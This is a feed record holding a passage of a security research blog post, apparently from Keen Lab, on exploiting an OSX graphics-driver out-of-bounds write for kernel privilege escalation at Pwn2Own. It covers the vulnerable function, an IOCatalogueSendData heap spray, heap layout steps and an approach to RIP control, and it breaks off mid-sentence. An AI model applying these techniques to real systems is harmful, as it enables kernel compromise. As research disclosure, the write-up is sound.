{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-10-19 10:32:51","updatedTime":"2020-10-19 10:32:51","title":"The Journey of a complete OSX privilege escalation with a single vulnerability - Part 1","link":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","description":"<p>In previous blog posts Liang talked about the userspace privilege escalation vulnerability we found in WindowServer. Now in following articles I will talk about the <code>Blitzard</code> kernel bug we used in this year’s pwn2own to escape the Safari renderer sandbox, existing in the <code>blit</code> operation of graphics pipeline. From a exploiter’s prospective we took advantage of an vector out-of-bound access which under carefully prepared memory situations will lead to write-anywhere-but-value-restricted to achieve both infoleak and RIP control. In this article we will introduce the exploitation methods we played with mainly in kalloc.48 and kalloc.4096. </p> \n<p>First we will first introduce the very function which the overflow occurs, what we can control and how these affect our following exploitation.<br><a id=\"more\"></a></br></p> \n<h2 id=\"The-IGVector-add-function\"><a href=\"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#The-IGVector-add-function\" class=\"headerlink\" title=\"The IGVector add function\"></a>The IGVector add function</h2> \n<figure class=\"highlight plain\"> \n <table> \n  <tr> \n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n   <td class=\"code\"><pre><span class=\"line\">char __fastcall IGVector&lt;rect_pair_t&gt;::add(IGVector *this, rect_pair_t *a2)</span><br><span class=\"line\">{</span><br><span class=\"line\">  v3 =;</span><br><span class=\"line\">  if ( this-&gt;currentSize != this-&gt;capacity )</span><br><span class=\"line\">    goto LABEL_4;</span><br><span class=\"line\"> LOBYTE(v4) = IGVector&lt;rect_pair_t&gt;::grow(this, 2 * v3);</span><br><span class=\"line\"> if ( v4 )</span><br><span class=\"line\"> </span><br><span class=\"line\">LABEL_4:</span><br><span class=\"line\"> this-&gt;currentSize += 1;</span><br><span class=\"line\"> v5 =;</span><br><span class=\"line\"> *(this-&gt;storage + 32 * this-&gt;currentSize + 24) = a2-&gt;field_18; //rect2.len height </span><br><span class=\"line\"> *(this-&gt;storage + 32 * this-&gt;currentSize + 16) = a2-&gt;field_10; //rect2.y x</span><br><span class=\"line\"> *(this-&gt;storage + 32 * this-&gt;currentSize + 8) = a2-&gt;field_8; //rect1.len height</span><br><span class=\"line\"> *(this-&gt;storage + 32 * this-&gt;currentSize) = a2-&gt;field_0; //rect1.y x</span><br><span class=\"line\"> }</span><br><span class=\"line\"> return v4;</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p><code>IGVector</code> is a generic template collection class used frequently in Apple Graphics drivers. On the head of it lies the <code>currentSize</code> field. Right following the <code>size</code> we have a <code>capacity</code> denoting the current volume of the vector. <code>storage</code> pointer goes after <code>capacity</code> field, recording the actual location of heap objects.<br><code>rect_pair_t</code> holds a pair of rectangles, each rectangle corresponds to a drawing section on screen. The fields of rect is listed as follows:</br></p> \n<ul> \n <li>int16 x</li> \n <li>int16 y</li> \n <li>int16 w</li> \n <li>int16 h</li> \n</ul> \n<p><code>x,y</code> denote the coordinate of rect’s corner on screen, while <code>w,h</code> denote the width and height of rectangle. The four fields uniquely locates a rectangle on screen. The initial arguments of rectangle is passed in via integer format, however after a series of multiplication and division they become an IEEE.754 floating number in memory, which makes Hex-rays suffer a lot because it can hardly deal with SSE floating point instructions :(</p> \n<p>When the overflow occurs, the memory layout is shown as the following figure.<br><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469783147725.png\" alt=\"Overflow in kalloc.48\" /></br></p> \n<p>As the figure shows, the <code>add</code> function is called on a partially out-of-bound 48-size block. The <code>size</code> field is fixed to 0xdeadbeefdeadbeef, because kalloc.48 is smaller than cache-line size, thus it will always be poisoned after freed. Good news is both <code>capacity</code> and <code>storage</code> pointer is under our control. This means we have a write-anywhere primitive covering the whole address space, by carefully preparing content satisfying the following equation, let<br><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/formula1.jpg\" alt=\"\"><br>then<br><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/formula2.jpg\" alt=\"\"><br>and also<br><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/formula3.jpg\" alt=\"\" /></br></br></img></br></br></img></br></p> \n<p>However we have a write-anywhere but it’s not a write-anything primitive. The rectangles initially have their fields in signed int16 format, falling in range [-0x8000, 0x7fff]. As the function is called, they have already been transformed to IEEE.754 representation in memory, which implies we can only use it to write two continously 4-byte value in range [0x3…, 0x4…., 0xc…, 0xd…, 0xbf800000] (0xbf800000 is float representation of -1) four times, corrupting 32 bytes of memory.</p> \n<h2 id=\"Control-the-kalloc-48-zone\"><a href=\"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#Control-the-kalloc-48-zone\" class=\"headerlink\" title=\"Control the kalloc.48 zone\"></a>Control the kalloc.48 zone</h2> \n<p>We need to precisely prepare controlled value right after the overflowed vector, otherwise the kernel will crash on a bad access. Unfortunately kalloc.48 is a zone used frequently in kernel with <code>IOMachPort</code> acting as the most commonly seen object and we must get rid of it. Previous work mainly comes up with <code>io_open_service_extended</code> and <code>ool_msg</code> to prepare the kernel heap. But problem arises for our situation:</p> \n<ul> \n <li><code>ool_msg</code> has small heap side-effect, but the head 0x18 bytes is not controllable while we need precise 8 bytes control at head 0x8 position</li> \n <li><code>io_open_service_extended</code> has massive side effect in kalloc.48 zone by producing an IOMachPort in every opened spraying connection</li> \n <li>in each <code>io_open_service_extended</code> call at most 37 items can be passed in kernel to occupy some space, which is constrained by the maximum properties count per IOServiceConnection can hold</li> \n</ul> \n<p>Thus we’re presenting a new spray technique: <code>IOCatalogueSendData</code> shown in following code snippet. Only one master_port is needed for continuously spraying, really energy-saving and earth friendly :)</p> \n<figure class=\"highlight plain\"> \n <table> \n  <tr> \n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n   <td class=\"code\"><pre><span class=\"line\">IOCatalogueSendData(</span><br><span class=\"line\">        mach_port_t     _masterPort,</span><br><span class=\"line\">        uint32_t                flag,</span><br><span class=\"line\">        const char             *buffer,</span><br><span class=\"line\">        uint32_t                size )</span><br><span class=\"line\">{</span><br><span class=\"line\">//...</span><br><span class=\"line\"></span><br><span class=\"line\"> kr = io_catalog_send_data( masterPort, flag,</span><br><span class=\"line\"> (char *) buffer, size, &amp;result );</span><br><span class=\"line\">//...</span><br><span class=\"line\"> if ((masterPort != MACH_PORT_NULL) &amp;&amp; (masterPort != _masterPort))</span><br><span class=\"line\"> mach_port_deallocate(mach_task_self(), masterPort);</span><br><span class=\"line\">//...</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">/* Routine io_catalog_send_data */</span><br><span class=\"line\">kern_return_t is_io_catalog_send_data(</span><br><span class=\"line\"> mach_port_t master_port,</span><br><span class=\"line\"> uint32_t flag,</span><br><span class=\"line\"> io_buf_ptr_t inData,</span><br><span class=\"line\"> mach_msg_type_number_t inDataCount,</span><br><span class=\"line\"> kern_return_t * result)</span><br><span class=\"line\">{</span><br><span class=\"line\">//...</span><br><span class=\"line\"> if (inData) {</span><br><span class=\"line\">//...</span><br><span class=\"line\"> kr = vm_map_copyout( kernel_map, &amp;map_data, (vm_map_copy_t)inData);</span><br><span class=\"line\"> data = CAST_DOWN(vm_offset_t, map_data);</span><br><span class=\"line\"> // must return success after vm_map_copyout() succeeds</span><br><span class=\"line\"> if( inDataCount ) {</span><br><span class=\"line\"> obj = (OSObject *)OSUnserializeXML((const char *)data, inDataCount);</span><br><span class=\"line\">//...</span><br><span class=\"line\"> switch ( flag ) {</span><br><span class=\"line\">//...</span><br><span class=\"line\"></span><br><span class=\"line\"> case kIOCatalogAddDrivers: </span><br><span class=\"line\"> case kIOCatalogAddDriversNoMatch: {</span><br><span class=\"line\">//...</span><br><span class=\"line\"> array = OSDynamicCast(OSArray, obj);</span><br><span class=\"line\"> if ( array ) {</span><br><span class=\"line\"> if ( !gIOCatalogue-&gt;addDrivers( array , </span><br><span class=\"line\"> flag == kIOCatalogAddDrivers) ) {</span><br><span class=\"line\">//...</span><br><span class=\"line\"> }</span><br><span class=\"line\"> break;</span><br><span class=\"line\">//...</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">bool IOCatalogue::addDrivers(</span><br><span class=\"line\"> OSArray * drivers,</span><br><span class=\"line\"> bool doNubMatching)</span><br><span class=\"line\">{</span><br><span class=\"line\"> //...</span><br><span class=\"line\"> while ( (object = iter-&gt;getNextObject()) ) {</span><br><span class=\"line\"> </span><br><span class=\"line\"> // xxx Deleted OSBundleModuleDemand check; will handle in other ways for SL</span><br><span class=\"line\"></span><br><span class=\"line\"> OSDictionary * personality = OSDynamicCast(OSDictionary, object);</span><br><span class=\"line\">//...</span><br><span class=\"line\"> // Add driver personality to catalogue.</span><br><span class=\"line\"> OSArray * array = arrayForPersonality(personality);</span><br><span class=\"line\"> if (!array) addPersonality(personality);</span><br><span class=\"line\"> else</span><br><span class=\"line\"> { </span><br><span class=\"line\"> count = array-&gt;getCount();</span><br><span class=\"line\"> while (count--) {</span><br><span class=\"line\"> OSDictionary * driver;</span><br><span class=\"line\"> </span><br><span class=\"line\"> // Be sure not to double up on personalities.</span><br><span class=\"line\"> driver = (OSDictionary *)array-&gt;getObject(count);</span><br><span class=\"line\">//...</span><br><span class=\"line\"> if (personality-&gt;isEqualTo(driver)) {</span><br><span class=\"line\"> break;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br><span class=\"line\"> if (count &gt;= 0) {</span><br><span class=\"line\"> // its a dup</span><br><span class=\"line\"> continue;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> result = array-&gt;setObject(personality);</span><br><span class=\"line\">//...</span><br><span class=\"line\"> set-&gt;setObject(personality); </span><br><span class=\"line\"> }</span><br><span class=\"line\">//...</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>The <code>addDrivers</code> functions accepts an <code>OSArray</code> with the following easy-to-meet conditions:</p> \n<ul> \n <li>OSArray contains an OSDict</li> \n <li>OSDict has key <code>IOProviderClass</code></li> \n <li>OSDict must not be exactly same as any other pre-exists OSDict in Catalogue</li> \n</ul> \n<p>We can prepare our sprayed content in the array part as the following sample XML shows, and slightly changes one char per spray to satisfy condition 3. Also OSString accepts all bytes except null byte, which can also be avoided. The spray goes as we call IOCatalogueSendData(masterPort, 2, buf, 4096} as many times as we wish.</p> \n<figure class=\"highlight plain\"> \n <table> \n  <tr> \n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n   <td class=\"code\"><pre><span class=\"line\">&lt;array&gt;</span><br><span class=\"line\">    &lt;dict&gt;</span><br><span class=\"line\">        &lt;key&gt;IOProviderClass&lt;/key&gt;</span><br><span class=\"line\">        &lt;string&gt;ZZZZ&lt;/string&gt;</span><br><span class=\"line\">        &lt;key&gt;ZZZZ&lt;/key&gt;</span><br><span class=\"line\"> &lt;array&gt;</span><br><span class=\"line\"> &lt;string&gt;AAAAAAAAAAAAAAAAAAAAAA&lt;/string&gt;</span><br><span class=\"line\"> &lt;string&gt;AAAAAAAAAAAAAAAAAAAAAB&lt;/string&gt;</span><br><span class=\"line\"> ...</span><br><span class=\"line\"> &lt;string&gt;ZZZZZZZZZZZZZZZZZZZZZZ&lt;string&gt;</span><br><span class=\"line\"> &lt;/array&gt;</span><br><span class=\"line\"> &lt;/dict&gt;</span><br><span class=\"line\">&lt;/array&gt;</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>So we have this following steps to play in kalloc.48 to achieve a stable write-anywhere:</p> \n<ul> \n <li><p>Spray lots of combination of 1 <code>ool_msg</code> and 50 <code>IOCatalogueSendData</code> (content of which totally controllable) (both of size 0x30), pushing allocations to continuous region.<br><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469792242612.png\" alt=\"kalloc.48-fengshui-1\" /></br></p></li> \n <li><p>free <code>ool_msg</code> at 1/3 to 2/3 part, leaving holes in allocation as shown below.<br><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469792270537.png\" alt=\"kalloc.48-fengshui-2\" /></br></p></li> \n <li><p>trigger vulnerable function, vulnerable allocation will fall in hole we previously left, as shown below.<br><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469792304375.png\" alt=\"kalloc.48-fengshui-3\"><br>In a nearly 100% chance the heap will layout as the previous figure, which exactly match what we expected. Spraying 50 or more 0x30 sized controllable content in one roll can reduce the possibility of some other irrelevant 0x30 content produced by other kernel activities such as <code>IOMachPort</code> to accidentally be just placed after free block occupied in, also enabling us to do a double-write, or triple-write, which we found crucial in following exploitation steps.</br></img></br></p></li> \n</ul> \n<h2 id=\"Write-a-float-to-control-RIP\"><a href=\"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#Write-a-float-to-control-RIP\" class=\"headerlink\" title=\"Write a float to control RIP\"></a>Write a float to control RIP</h2> \n<p>After we have made the write itself stable, we move forward to turn the write into actual RIP control and/or infoleak. The first idea that will pop up is to overwrite some vtable pointer at the head of some userclients. Seems at first hand this vulnerability is not a very good write primitive because we will certainly corrupt the poor userclient, as shown in the following figure:</p> \n<p><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469785931993.png\" alt=\"wrong-way-overwrite\"><br>In OSX kernel addresses starting with high byte at 0xbf is almost impossible (or you can just say impossible) to be occupied or prepared for some content. But we are also unable to adjust the value we write to start with 0xffffff80 to point the address to a heap location we can control due to the nature of <code>Blitzard</code>.</br></img></p> \n<p>But thanks to Intel CPUs, we can make a qword write at an unaligned location, i.e. 4byte offset.</p> \n<p><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469785992006.png\" alt=\"slide-write-4byte\" /></p> \n<p>This looks reasonable but we found the stability is not promising. This is because in the huge family of userclients, it seems only <code>RootDomainUserClient</code> has a virtual table pointer high bytes of which is 0xffffff80. Other userclient friends all have vtable pointer address 4th byte of which is 0x7f. Address spaces starting with 0xffffff7f00000000 are usually occupied by non-writable sections so it’s not possible to manipulate memory here to gain some degree of memory control, while on the other hand, address spaces high bytes of which are 0xffffff80 expose some possibility to contain heap regions.</p> \n<h3 id=\"Decreasing-spray-speed-Why\"><a href=\"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#Decreasing-spray-speed-Why\" class=\"headerlink\" title=\"Decreasing spray speed? Why?\"></a>Decreasing spray speed? Why?</h3> \n<p>But <code>RootDomainUserClient</code> is a small userclient and we need to spray lots of them to guarantee that at begining of a particular PAGE there’s good chance the <code>RootDomainUserClient</code> falls there. However quickly we found out the spray speed decreases obviously as the number of userclient increases. After some investigation we found out the root cause of this issue, check the following code snippet.<br><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469786702894.png\" alt=\"kernel-stack-trace\"><br> \n    <figure class=\"highlight plain\"> \n     <table> \n      <tr> \n       <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n       <td class=\"code\"><pre><span class=\"line\">bool IORegistryEntry::attachToParent( IORegistryEntry * parent,</span><br><span class=\"line\">1621                                 const IORegistryPlane * plane )</span><br><span class=\"line\">1622 {</span><br><span class=\"line\">1623     OSArray *links;</span><br><span class=\"line\">1624     boolret;</span><br><span class=\"line\">1625 boolneedParent;</span><br><span class=\"line\">//...</span><br><span class=\"line\">1635 ret = makeLink( parent, kParentSetIndex, plane );</span><br><span class=\"line\">1636 </span><br><span class=\"line\">1637 if( (links = parent-&gt;getChildSetReference( plane )))</span><br><span class=\"line\">1638 needParent = (false == arrayMember( links, this ));</span><br><span class=\"line\">1639 else</span><br><span class=\"line\">1640 needParent = true;</span><br><span class=\"line\">1641 </span><br><span class=\"line\">//...</span><br><span class=\"line\">1669 if( needParent)</span><br><span class=\"line\">1670 ret &amp;= parent-&gt;attachToChild( this, plane );</span><br><span class=\"line\">1671 </span><br><span class=\"line\">1672 return( ret );</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n      </tr> \n     </table> \n    </figure></br></img></br></p> \n<p>Here <code>arrayMember</code> performs a linear search on existing attached client, which already implies a O(N^2) time complexity. </p> \n<p>Can things be worse? Let’s go further. When userclients are opened, they need to be attached to their parent. This will in turn call <code>parent-&gt;attachToChild</code><br> \n  <figure class=\"highlight plain\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br /></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\">bool IORegistryEntry::attachToChild( IORegistryEntry * child,</span><br><span class=\"line\">1684                                         const IORegistryPlane * plane )</span><br><span class=\"line\">1685 {</span><br><span class=\"line\">1686     OSArray *links;</span><br><span class=\"line\">//...</span><br><span class=\"line\">1694 </span><br><span class=\"line\">1695 ret = makeLink( child, kChildSetIndex, plane );</span><br /></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p>then<br> \n  <figure class=\"highlight plain\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br /></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\"> bool IORegistryEntry::makeLink( IORegistryEntry * to,</span><br><span class=\"line\">1314                                 unsigned int relation,</span><br><span class=\"line\">1315                                 const IORegistryPlane * plane ) const</span><br><span class=\"line\">1316 {</span><br><span class=\"line\">1317     OSArray *links;</span><br><span class=\"line\">1318 boolresult = false;</span><br><span class=\"line\">//...</span><br><span class=\"line\">1323 result = arrayMember( links, to );</span><br><span class=\"line\">1324 if( !result)</span><br><span class=\"line\">1325 result = links-&gt;setObject( to );</span><br><span class=\"line\">1326 </span><br><span class=\"line\">1327 } else {</span><br /></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p>The <code>links</code> is an <code>OSArray</code>, and <code>setObject</code> inserts new userclient into the array storage, which calls into this expensive function<br> \n  <figure class=\"highlight plain\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\">unsigned int OSArray::ensureCapacity(unsigned int newCapacity)</span><br><span class=\"line\">185 {</span><br><span class=\"line\">//...</span><br><span class=\"line\">203     newArray = (const OSMetaClassBase **) kalloc_container(newSize);</span><br><span class=\"line\">204     if (newArray) {</span><br><span class=\"line\">205 oldSize = sizeof(const OSMetaClassBase *) * capacity;</span><br><span class=\"line\">206 </span><br><span class=\"line\">207 OSCONTAINER_ACCUMSIZE(((size_t)newSize) - ((size_t)oldSize));</span><br><span class=\"line\">208 </span><br><span class=\"line\">209 bcopy(array, newArray, oldSize);</span><br><span class=\"line\">210 bzero(&amp;newArray[capacity], newSize - oldSize);</span><br><span class=\"line\">211 kfree(array, oldSize);</span><br><span class=\"line\">212 array = newArray;</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469793140738.png\" alt=\"spray-number-time-plotgraph\"><br>So in a conclusion, the spraying time has a N^2 time complexity relationship with opened userclient per service. This may not be a big problem for powerful Macbook Pros, but we found the Core M processor in the new Macbook (which is unfortunately the machine we need to exploit in Pwn2Own competition) as slow as grandma, which forces us to found better and faster ways.<br>Fortunately, a new method pops up and we solved RIP control and info leak problems in one shot. That’s perfect.</br></br></img></p> \n<h3 id=\"IGAccelVideoContext-comes-to-rescue\"><a href=\"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#IGAccelVideoContext-comes-to-rescue\" class=\"headerlink\" title=\"IGAccelVideoContext comes to rescue\"></a>IGAccelVideoContext comes to rescue</h3> \n<p>As we searches for helpful userclients, the following criterias must be met:</p> \n<ul> \n <li>It must be reachable from sandbox</li> \n <li>Size of userclient must be larger than PAGE_SIZE, and bigger is better (faster spray speed)</li> \n</ul> \n<p>We have to admit directly overwriting vtable pointers is not a good solution for our vulnerability. Can we overwrite some field pointers of userclient? The answer is yes. <code>IGAccelVideoContext</code> is a perfect candidate with size 0x2000. Nearly all IOAcceleratorFamily2 userclients have a <code>service</code> pointer associated, and it point to the mother <code>IntelAccelerator</code>. In the following figure we can see at offset 0x528 we saw the appearance of this pointer. It’s a heap location which means we can use the previous mentioned so-called <code>slide-writing</code> to overwrite only lower 4bytes to make it point to heap memory we can control.<br><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469793670597.png\" alt=\"the service pointer\" /></br></p> \n<h4 id=\"RIP-control\"><a href=\"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#RIP-control\" class=\"headerlink\" title=\"RIP control\"></a>RIP control</h4> \n<p>Further study reveals there are virtual function calls on this pointer. But we need to take extra caution as we cannot directly call the fake <code>service</code>‘s virtual function, because the header of <code>vm_map_copy</code> is not controllable. So we take another approach as we found out <code>context_finish</code> function does an indirect call on <code>service-&gt;mEventMachine</code>,<br> \n  <figure class=\"highlight plain\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br /></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\">__int64 __fastcall IOAccelContext2::context_finish(IOAccelContext2 *this)</span><br><span class=\"line\">{</span><br><span class=\"line\">  int v1; // eax@1</span><br><span class=\"line\">  unsigned int v2; // ecx@1</span><br><span class=\"line\"></span><br><span class=\"line\"> v1 = this-&gt;service-&gt;mEventMachine-&gt;vt-&gt;__ZN24IOAccelEventMachineFast219finishEventUnlockedEP12IOAccelEvent(</span><br><span class=\"line\"> this-&gt;service-&gt;mEventMachine,</span><br /></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p>We now adjust our goal to overwrite the <code>service</code> field of any <code>IGAccelVideoContext</code>. Given no knowledge of heap addresses, we again need to spray lots of userclients to achieve our goal. After trial and errors we finally took the following steps:</p> \n<ul> \n <li>Spray 0x50,000 ool_msgs, pushing heap covering 0xffffff80 bf800000 (<code>B</code>) with controlled content (ool)</li> \n <li>free middle parts of ool, fill with IGAccelVideoContext covering 0xffffff80 62388000 (<code>A</code>)</li> \n <li>Perform write at <code>A - 4 + 0x528</code> descending, change <code>service</code> pointer to 0xffffff80 bf800000 (<code>B</code>)</li> \n <li>Call each IGAccelVideoContext’s externalMethod and detect corruption</li> \n</ul> \n<p>Why we choose the particular addresses <code>A</code> and <code>B</code>? As we recall in previous paragraphs, we can only write float in particular ranges to an expected location, which means we can change pointers like 0xffffff80 deadbeef to 0xffffff80 3xxxxxxx, 0xffffff80 4xxxxxxx, 0xffffff80 cxxxxxxx, 0xffffff80 dxxxxxxx and 0xffffff80 bf800000. These addresses are either too low (kASLR changes in each boot and high kASLR value may shift heap location very high, flooding 0xffffff80 4xxxxxxx), or too high (need lots of spray time to reach). So we choose to write 0xbf800000 to some pointers and taking half from <code>B</code> lead to <code>A</code>.</p> \n<p>This code snippet shows how to do the previous mentioned 